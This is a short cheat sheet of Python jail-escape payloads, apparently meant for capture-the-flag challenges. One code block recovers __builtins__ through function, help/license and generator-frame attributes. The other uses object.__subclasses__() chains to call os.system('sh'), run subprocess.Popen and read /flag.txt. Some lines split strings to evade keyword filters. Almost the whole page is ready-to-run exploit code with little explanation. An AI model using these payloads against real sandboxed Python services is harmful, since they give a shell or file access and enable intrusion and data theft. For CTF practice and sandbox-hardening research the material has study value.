---
title: python jail bypass
---
# pyjail
## builtins {#builtins}
```python showLineNumbers
# obtain builtins from a globally defined built-in functions
# https://docs.python.org/3/library/functions.html
print.__self__
__build_class__.__self__
__import__.__self__

# obtain builtins from site-module constants
# https://docs.python.org/3/library/constants.html#constants-added-by-the-site-module
help.__call__.__builtins__ # or __globals__
help.__repr__.__globals__["sys"] # can chain with sys.modules
license.__repr__.__builtins__ # or __globals__
license.__repr__.__globals__["sys"] # can chain with sys.modules

# obtain the builtins from a defined function
func.__globals__['__builtins__']
(lambda:...).__globals__

# obtain builtins from generators
(_ for _ in ()).gi_frame.f_builtins
(_ for _ in ()).gi_frame.f_globals["__builtins__"]
(await _ for _ in ()).ag_frame.f_builtins
(await _ for _ in ()).ag_frame.f_globals["__builtins__"]
```

## subclasses {#subclasses}
```python showLineNumbers
# <class '_frozen_importlib.BuiltinImporter'>
().__class__.__mro__[1].__subclasses__()[104].load_module("os").system("sh");

# <class '_frozen_importlib_external.FileLoader'>
().__class__.__bases__[0].__subclasses__()[118].get_data(".", "/flag.txt")

# <class '_io._IOBase'> -> <class '_io._RawIOBase'> -> <class '_io.FileIO'>
().__class__.__mro__[1].__subclasses__()[111].__subclasses__()[0].__subclasses__()[0]("/flag.txt").read()

# <class 'os._wrap_close'>
().__class__.__mro__[1].__subclasses__()[137].__init__.__builtins__["__import__"]("os").system("sh")
().__class__.__mro__[1].__subclasses__()[137].__init__.__globals__["system"]("sh")
().__class__.__mro__[1].__subclasses__()[137].close.__globals__["system"]("sh")

# <class 'subprocess.Popen'>
().__class__.__mro__[1].__subclasses__()[262](["cat","/flag.txt"], stdout=-1).communicate()[0]

# <class 'abc.ABC'> -> <class 'abc.ABCMeta'>
().__class__.__mro__[1].__subclasses__()[129].__class__.register.__builtins__["__import__"]("os").system("sh")

# <class 'collections.Counter'>
{}.__class__.__subclasses__()[2].copy.__builtins__["__import__"]("os").system("sh")
{}.__class__.__subclasses__()[2].update.__builtins__["__import__"]("os").system("sh")

# <class 'generator'> - instance
(_ for _ in ()).gi_frame.f_globals["__loader__"].load_module("os").system("sh")
(_ for _ in ()).gi_frame.f_globals["__builtins__"].__import__("os").system("sh")

# <class 'async_generator'> - instance
(await _ for _ in ()).ag_frame.f_globals["_""_loader_""_"].load_module("os").system("sh")
(await _ for _ in ()).ag_frame.f_globals["_""_builtins_""_"].eval("_""_import_""_('os').system('sh')")
```